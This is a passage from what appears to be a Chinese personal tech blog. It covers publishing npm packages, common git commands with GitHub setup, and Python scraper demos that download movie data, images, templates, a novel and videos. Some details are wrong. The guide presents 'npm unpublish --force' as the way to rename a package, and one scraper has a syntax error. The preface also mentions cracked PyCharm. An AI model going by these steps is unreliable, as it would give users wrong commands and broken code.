下面注释是可选的，可以根据需要添加，如果需要打包成 umd 模块或者 es module 模块，可以添加</span></span><br><span class="line">  <span class="comment">// &quot;module&quot;: &quot;dist/index.esm.js&quot;,        // es mouule 入口文件</span></span><br><span class="line">  <span class="comment">// &quot;browser&quot;: &quot;dist/index.js&quot;,           // 浏览器入口文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个是 ts 的声明文件入口文件，如果你的包是用 ts 写的，那么可以添加</span></span><br><span class="line">  <span class="comment">// &quot;types&quot;: &quot;dist/index.d.ts&quot;,           // ts 声明文件入口文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个是你要发布的文件，可以是文件夹，也可以是文件，如果是文件夹，那么会发布文件夹下的所有文件</span></span><br><span class="line">  <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// 需要发布的文件</span></span><br><span class="line">    <span class="string">&quot;dist&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xie392&quot;</span><span class="punctuation">,</span> <span class="comment">// 作者</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span><span class="punctuation">,</span> <span class="comment">// 开源协议</span></span><br><span class="line">  <span class="comment">// 这里是添加的配置，后面会讲到</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rollup -c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 仓库地址</span></span><br><span class="line">  <span class="attr">&quot;repository&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git+https://github.com/xie392/plugin-name.git&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>执行打包命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>
<h1>五、发布</h1>
<p>1、添加用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm adduser</span><br></pre></td></tr></table></figure>
<p>输入用户名、密码、邮箱，在此之前需要在 <a href="https://www.npmjs.com">npm 官网</a> 注册并创建 npm 账号，还有 npm 的源一定要是官方的源，不然会出现各种问题,如果不是请换回来。</p>
<p>查看源</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure>
<p>如果不是官方源: <code>https://registry.npmjs.org</code>，那么就换成官方源</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure>
<p>2、发布</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure>
<p>如果你的包是私有的，那么就需要添加<code>--access=public</code>参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm publish --access=public</span><br></pre></td></tr></table></figure>
<p>如果包名已经存在，那么就需要修改包名，然后再发布,修改包名的命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm unpublish 包名 --force</span><br></pre></td></tr></table></figure>
<p>怎么知道包名是否存在呢？可以在 <a href="https://www.npmjs.com">npm 官网</a> 搜索一下，如果存在，那么就不能使用这个包名，如果不存在，那么就可以使用这个包名。</p>
<h1>六、使用</h1>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i plugin-name -S</span><br></pre></td></tr></table></figure>
<h1>七、更新 npm 包</h1>
<p>更新 npm 包就需要用到以下命令了</p>
<p>查看当前版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm view plugin-name version</span><br></pre></td></tr></table></figure>
<p>小更新可以使用以下命令，会自动更新版本号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">小更新版本号，例如 1.0.0 -&gt; 1.0.1</span></span><br><span class="line">npm version patch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发布</span></span><br><span class="line">npm publish</span><br></pre></td></tr></table></figure>
<p>大更新可以使用以下命令，会自动更新版本号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">大更新版本号，例如 1.0.0 -&gt; 1.1.0</span></span><br><span class="line">npm version minor</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发布</span></span><br><span class="line">npm publish</span><br></pre></td></tr></table></figure>
<p>超大更新可以使用以下命令，会自动更新版本号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">超大更新版本号，例如 1.0.0 -&gt; 2.0.0</span></span><br><span class="line">npm version major</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发布</span></span><br><span class="line">npm publish</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>分享</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>NPM</tag>
      </tags>
  </entry>
  <entry>
    <title>上传项目至GitHub</title>
    <url>/Other/%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE%E5%88%B0Github/</url>
    <content><![CDATA[<h3 id="git常用指令">git常用指令</h3>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">git --version</td>
<td style="text-align:left">查看版本</td>
</tr>
<tr>
<td style="text-align:left">git init</td>
<td style="text-align:left">初始化仓库</td>
</tr>
<tr>
<td style="text-align:left">git config --global <a href="http://user.name">user.name</a>  “name”</td>
<td style="text-align:left">配置名称</td>
</tr>
<tr>
<td style="text-align:left">git config --global user.email “@qq.com”</td>
<td style="text-align:left">配置邮箱</td>
</tr>
<tr>
<td style="text-align:left">git add ./</td>
<td style="text-align:left">添加文件，./代表当前目录</td>
</tr>
<tr>
<td style="text-align:left">git status</td>
<td style="text-align:left">检查代码状态</td>
</tr>
<tr>
<td style="text-align:left">git commit -m “name”</td>
<td style="text-align:left">添加内容</td>
</tr>
<tr>
<td style="text-align:left">git log --oneline</td>
<td style="text-align:left">查看记录</td>
</tr>
<tr>
<td style="text-align:left">git reset --hard Head~0(1)</td>
<td style="text-align:left">修改版本</td>
</tr>
<tr>
<td style="text-align:left">git reset —hard “version”</td>
<td style="text-align:left">回退指定版本号</td>
</tr>
<tr>
<td style="text-align:left">git reflog</td>
<td style="text-align:left">查看历史操作</td>
</tr>
<tr>
<td style="text-align:left">git branch “name”</td>
<td style="text-align:left">创建分支</td>
</tr>
<tr>
<td style="text-align:left">git branch</td>
<td style="text-align:left">查看分支</td>
</tr>
<tr>
<td style="text-align:left">git checkout dev</td>
<td style="text-align:left">切换分支，[-b] 创建并切换</td>
</tr>
<tr>
<td style="text-align:left">git branch -d/-D “name”</td>
<td style="text-align:left">删除分支</td>
</tr>
<tr>
<td style="text-align:left">git merge “name”</td>
<td style="text-align:left">合并分支</td>
</tr>
<tr>
<td style="text-align:left">git clone http:…</td>
<td style="text-align:left">克隆代码</td>
</tr>
</tbody>
</table>
<p>1.首次配置仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name  &quot;xie392&quot;  </span><br><span class="line">git config --global user.email &quot;2636.@qq.com&quot;</span><br></pre></td></tr></table></figure>
<p>2.初始化仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init </span><br></pre></td></tr></table></figure>
<p>3.推送内容到仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>
<p>4.添加内容名称（必须）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;name&quot;</span><br></pre></td></tr></table></figure>
<p>5.连接远程仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add origin https:xie392...</span><br></pre></td></tr></table></figure>
<p>6.上传至远程仓库(第一次推送会让你输入账号密码)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>
<p>完成以上步骤基本已经完成，下面可以选择做或不做</p>
<h3 id="配置密钥-ssh-key">配置密钥 ssh key</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;2636.qq.com&quot;</span><br></pre></td></tr></table></figure>
<p>生成的密钥在&quot;<mark class="hl-label green">C:\Users\Administrator\.ssh</mark> “目录下,把目录下的”<mark class="hl-label green">id_rsa.pub</mark> &quot;文件打开并复制里面的内容<br>
来到github仓库，点击 Settings(设置)–Deploy keys(部署密钥)–Add Deploy keys(添加部署密钥)</p>
<h3 id="常见报错">常见报错</h3>
<h4 id="error-remote-origin-already-exists">error: remote origin already exists.</h4>
<p>错误原因：远程来源已经存在<br>
解决方法：<br>
删除关联的origin的远程库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure>
<p>重新关联origin的远程库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add origin https:xie392...</span><br></pre></td></tr></table></figure>
<h4 id="fatal-Could-not-read-from-remote-repository">fatal: Could not read from remote repository.</h4>
<p>错误原因：客户端与服务端未生成 ssh key 或客户端与服务端的 ssh key 不匹配<br>
解决方法：重新生成新的 ssh key</p>
]]></content>
      <categories>
        <category>分享</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫</title>
    <url>/Python/Python%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h1>前言</h1>
<p>本文使用软件为 pycharm ,没有的可以去安装以下。如果找不到专业版（Professional）的破解版就安装下载社区版(Community) ，点击这里 <a href="https://www.jetbrains.com.cn/en-us/pycharm/download/#section=windows">下载</a>。如果没有 python 环境也请装一下，点击 <a href="https://www.python.org/downloads/">下载</a>,配置环境变量这里就不说了，如果是默认安装地址的话，一般不用配置。下面是一些 demo，主要方便自己回来查看，并非教学，有兴趣可以看看 <a href="https://www.bilibili.com/video/BV1Yh411o7Sz?spm_id_from=333.999.0.0">教学视频</a>，非常推荐！！！</p>
<h1>1、豆瓣电影</h1>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标网址</span></span><br><span class="line">url = <span class="string">&#x27;https://movie.douban.com/j/chart/top_list&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">param = &#123;</span><br><span class="line">     <span class="string">&quot;type&quot;</span>:<span class="string">&quot;24&quot;</span>,</span><br><span class="line">     <span class="string">&quot;interval_id&quot;</span>: <span class="string">&quot;100:90&quot;</span>,</span><br><span class="line">     <span class="string">&quot;action&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">     <span class="string">&quot;start&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">     <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;20&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># UA伪装</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/90.0.4430.85Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url, params=param, headers=header)</span><br><span class="line"></span><br><span class="line">data_json = response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 json 文件</span></span><br><span class="line">filename = <span class="built_in">open</span>(<span class="string">&#x27;./豆瓣.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件</span></span><br><span class="line">json.dump(data_json, fp=filename, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;over!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1>2、糗图</h1>
<p>这个网址失效了，所以看看就行</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断有无该文件夹，如果没有就创建该文件</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./糗图&#x27;</span>):</span><br><span class="line">    os.mkdir(<span class="string">&#x27;./糗图&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    url = <span class="string">f&#x27;https://www.qiushibaike.com/imgrank/page/<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    response = requests.get(url=url, headers=headers).text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 正则</span></span><br><span class="line">    img_list = <span class="string">&#x27;&lt;div class=&quot;thumb&quot;&gt;.*?&lt;img src=&quot;(.*?)&quot; alt.*?&lt;/div&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    image_data = re.findall(img_list, response, re.S)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> src_img <span class="keyword">in</span> image_data:</span><br><span class="line"></span><br><span class="line">        src_img = <span class="string">&#x27;https:&#x27;</span> + src_img</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            img_data = requests.get(url=src_img, headers=headers, timeout=<span class="number">15</span>).content</span><br><span class="line"></span><br><span class="line">            img_name = src_img.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            imgPath = <span class="string">&#x27;./糗图/&#x27;</span> + img_name</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(imgPath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img_data)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;成功&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;over!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1>3、站长素材简历模板</h1>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./模板&#x27;</span>) :</span><br><span class="line">    os.mkdir(<span class="string">&#x27;./模板&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/90.0.4430.85Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr = [<span class="string">&#x27;free&#x27;</span>,<span class="string">&#x27;free_2&#x27;</span>,<span class="string">&#x27;free_3&#x27;</span>,<span class="string">&#x27;free_4&#x27;</span>,<span class="string">&#x27;free_5&#x27;</span>,<span class="string">&#x27;free_6&#x27;</span>,<span class="string">&#x27;free_7&#x27;</span>,<span class="string">&#x27;free_8&#x27;</span>,<span class="string">&#x27;free_9&#x27;</span>,<span class="string">&#x27;free_10&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    url = <span class="string">f&#x27;https://sc.chinaz.com/jianli/<span class="subst">&#123;i&#125;</span>.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    page_text = requests.get(url=url, headers=headers</span><br><span class="line"></span><br><span class="line">    <span class="comment"># xpath</span></span><br><span class="line">    html = etree.HTML(page_text.text)</span><br><span class="line"></span><br><span class="line">    div_img = html.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div/div/a/@href&#x27;</span>)  <span class="comment"># 所有链接后面的连接词</span></span><br><span class="line"></span><br><span class="line">    title = html.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div/div/p/a&#x27;</span>)  <span class="comment"># 所有标题</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> src <span class="keyword">in</span> div_img:</span><br><span class="line">        new_url = <span class="string">&#x27;https:&#x27;</span> + src</span><br><span class="line"></span><br><span class="line">        res = requests.get(url=new_url, headers=headers)</span><br><span class="line"></span><br><span class="line">        res.encoding = <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="comment"># 自动解码</span></span><br><span class="line">        <span class="comment"># res.encoding = res.apparent_encoding</span></span><br><span class="line"></span><br><span class="line">        res_html = etree.HTML(res.text)</span><br><span class="line"></span><br><span class="line">        title_name = res_html.xpath(<span class="string">&#x27;//*[@class=&quot;ppt_left fl&quot;]/div/div/h1/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        download_url = res_html.xpath(<span class="string">&#x27;//*[@id=&quot;down&quot;]/div[2]/ul/li[1]/a/@href&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        download = requests.get(download_url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;模板/&quot;</span> + title_name + <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(download.content)</span><br><span class="line">            <span class="built_in">print</span>(title_name + <span class="string">&#x27;---------------下载成功&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>4、盗墓笔记</h1>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.duquanben.com/xiaoshuo/5/5823/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/90.0.4430.85Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">res.encoding = <span class="string">&quot;GBK&quot;</span></span><br><span class="line"></span><br><span class="line">html = etree.HTML(res.text)</span><br><span class="line"></span><br><span class="line">title = html.xpath(<span class="string">&#x27;//*[@id=&quot;header&quot;]/div[3]/div[3]/ul/li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;&#x27;</span>.join(html.xpath(<span class="string">&#x27;//*[@id=&quot;header&quot;]/div[5]/div/div[4]/text()&#x27;</span>)).strip()</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;盗墓笔记.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> title:</span><br><span class="line">    new_url = <span class="string">&#x27;https://www.duquanben.com/xiaoshuo/5/5823/&#x27;</span> + li.xpath(<span class="string">&#x27;./a/@href&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    page_title = li.xpath(<span class="string">&#x27;./a/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    page_text = requests.get(url=new_url, headers=headers)</span><br><span class="line"></span><br><span class="line">    page_text.encoding = <span class="string">&quot;GBK&quot;</span></span><br><span class="line"></span><br><span class="line">    html_xp = etree.HTML(page_text.text)</span><br><span class="line"></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span>.join(html_xp.xpath(<span class="string">&#x27;//*[@id=&quot;header&quot;]/div[5]/div/div[4]/text()&#x27;</span>)).strip()</span><br><span class="line"></span><br><span class="line">    fp.write(page_title + <span class="string">&#x27;\n\n&#x27;</span> + content + <span class="string">&#x27;\n\n\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(page_title) + <span class="string">&#x27;--------------下载成功！！！&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1>5、梨视频</h1>
<p>这个写的我也有点忘记了……我记得当时那个教学视频写这个案例时是实现不了的，也不记得我是怎么百度出来的了……先留着吧，或许以后就记得了哈哈哈</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./video&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&#x27;./video&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"> 	 <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/90.0.4430.85Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.pearvideo.com/category_5&#x27;</span></span><br><span class="line"></span><br><span class="line">page_text = requests.get(url=url,headers=headers).text</span><br><span class="line"></span><br><span class="line">tree = etree.HTML(page_text)</span><br><span class="line"></span><br><span class="line">li_list = tree.xpath(<span class="string">&#x27;//*[@id=&quot;listvideoListUl&quot;]/li&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 储存所有视频的连接和名字</span></span><br><span class="line">urls = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> li_list :</span><br><span class="line">    li_url = <span class="string">&#x27;https://www.pearvideo.com/&#x27;</span> + li.xpath(<span class="string">&#x27;./div/a/@href&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    video_text = requests.get(url=li_url,headers=headers)</span><br><span class="line"></span><br><span class="line">    new_tree = etree.HTML(video_text.text)</span><br><span class="line"></span><br><span class="line">    name = new_tree.xpath(<span class="string">&#x27;//*[@id=&quot;detailsbd&quot;]/div[1]/div[2]/div/div[1]/h1/text()&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.mp4&#x27;</span></span><br><span class="line"></span><br><span class="line">    id_ = <span class="built_in">str</span>(li.xpath(<span class="string">&#x27;./div/a/@href&#x27;</span>)[<span class="number">0</span>]).split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    ajax_url = <span class="string">&#x27;https://www.pearvideo.com/videoStatus.jsp&#x27;</span></span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;contId&#x27;</span>: id_,</span><br><span class="line">        <span class="string">&#x27;mrd&#x27;</span>: <span class="built_in">str</span>(random.random())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ajax_headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3823.400 QQBrowser/10.7.4307.400&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.pearvideo.com/video_&#x27;</span> + id_</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dic_obj = requests.get(url=ajax_url, params=params, headers=ajax_headers).json()</span><br><span class="line"></span><br><span class="line">    video_url = dic_obj[<span class="string">&quot;videoInfo&quot;</span>][<span class="string">&#x27;videos&#x27;</span>][<span class="string">&quot;srcUrl&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    video_true_url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    s_list = <span class="built_in">str</span>(video_url).split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s_list)):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(s_list) - <span class="number">1</span>:</span><br><span class="line">            video_true_url += s_list[i] + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ss_list = s_list[i].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ss_list)):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">            video_true_url += <span class="string">&#x27;cont-&#x27;</span> + id_ + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> j == <span class="built_in">len</span>(ss_list) - <span class="number">1</span>:</span><br><span class="line">            video_true_url += ss_list[j]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            video_true_url += ss_list[j] + <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">    dic = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: video_true_url</span><br><span class="line">    &#125;</span><br><span class="line">    urls.append(dic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用线程池对视频数据进行请求(较为耗时的阻塞操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_video_data</span>(<span class="params">dic_</span>):</span><br><span class="line">    url_ = dic_[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dic_[<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;正在下载.....&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    video_data = requests.get(url=url_, headers=headers).content</span><br><span class="line"></span><br><span class="line">    video_path = <span class="string">&#x27;./video/&#x27;</span> + dic_[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(video_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(video_data)</span><br><span class="line">        <span class="built_in">print</span>(dic_[<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;下载成功!!!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pool = Pool(<span class="number">4</span>)</span><br><span class="line">pool.<span class="built_in">map</span>(get_video_data, urls)</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
<h1>5、彼岸图网</h1>
